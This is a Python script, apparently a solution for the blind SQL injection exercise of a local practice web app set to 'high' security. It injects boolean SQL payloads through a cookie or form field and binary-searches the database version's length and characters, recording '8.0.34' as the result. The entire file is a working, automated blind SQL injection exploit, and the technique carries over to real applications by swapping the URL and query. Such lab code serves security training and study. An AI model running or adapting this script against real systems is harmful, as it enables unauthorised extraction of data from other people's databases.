"""
Solution to SQL Injection (Blind)
"""

import requests
import urllib
import re

URL = "http://localhost/vulnerabilities/sqli_blind/"
PHPSESSID = "c2b5c3cf8991f6348b0ddb24f3e92605"
SECURITY = "high"


def query_by_get(data):
    data = urllib.parse.quote(data)
    response = requests.get(
        url=URL,
        headers={"Cookie": f"id={data}; PHPSESSID={PHPSESSID}; security={SECURITY}"},
    )
    return re.search("MISSING", response.text) is None


def query_by_post(data):
    data = urllib.parse.quote(data)
    response = requests.post(
        url=URL,
        data=f"id={data}&Submit=Submit",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"PHPSESSID={PHPSESSID}; security={SECURITY}",
        },
    )
    return re.search("MISSING", response.text) is None


def crack_length():
    template = "1' and length(version()){}{};#"
    lower, upper = 1, 100

    while lower + 1 < upper:
        mid = (lower + upper) // 2
        if query_by_get(template.format("<", mid)):
            upper = mid
        else:
            lower = mid

    if query_by_get(template.format("=", lower)):
        return lower

    return False


def crack_characters(length):
    template = "1' and substr(version(),{},1){}{}#"
    prefix = ""

    for i in range(1, length + 1):
        lower, upper = 33, 127

        while lower + 1 < upper:
            mid = (lower + upper) // 2
            if query_by_get(template.format(i, "<", hex(mid))):
                upper = mid
            else:
                lower = mid

        if query_by_get(template.format(i, "=", hex(lower))):
            prefix += chr(lower)
        else:
            return False

    return prefix


def main():
    length = crack_length()
    print(length)
    result = crack_characters(length)
    print(result)


if __name__ == "__main__":
    main()
    # 8.0.34
